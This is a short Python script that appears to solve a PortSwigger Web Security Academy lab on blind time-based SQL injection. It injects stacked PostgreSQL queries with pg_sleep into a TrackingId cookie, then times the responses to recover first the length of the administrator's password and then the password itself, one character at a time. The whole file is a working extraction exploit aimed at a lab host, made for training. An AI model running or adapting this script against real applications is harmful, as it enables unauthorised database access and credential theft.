import requests
import datetime

# Scenario :- https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#
# Here we are introducing time delay to check if the query is valid and getting data one after the other.

def check_time_for_char(url):
    try:
        password = ''
        for i in range(1,21):
            for j in range(48,58):
                cookies_value = f"zPpD4HvI0r7ZMlkb'%3BSELECT+CASE+WHEN+(username='administrator' AND+SUBSTRING(password,{i},1)='{chr(j)}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if response.elapsed > datetime.timedelta(seconds=10):
                    password = password+chr(j)
                    print(chr(j))
                    break
            for j in range(97,123):
                cookies_value = f"zPpD4HvI0r7ZMlkb'%3BSELECT+CASE+WHEN+(username='administrator' AND+SUBSTRING(password,{i},1)='{chr(j)}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if response.elapsed > datetime.timedelta(seconds=10):
                    password = password+chr(j)
                    print(chr(j))
                    break
        return password

    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False


def passwordLength(url):
    for i in range(1,30):
        cookies_value = f"Wx3OeMAUBbXXSG09'%3BSELECT+CASE+WHEN+(username='administrator' AND+LENGTH(password)>{i})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
        response = requests.get(url, cookies={'TrackingId':cookies_value})
        if response.elapsed < datetime.timedelta(seconds=5):
            print(f'Password length is :{i}')
            return i
    return 0

url = 'https://0aad00330333f71283e43cae0053003e.web-security-academy.net/filter?category=Accessories'
# print(passwordLength(url))
print(check_time_for_char(url))
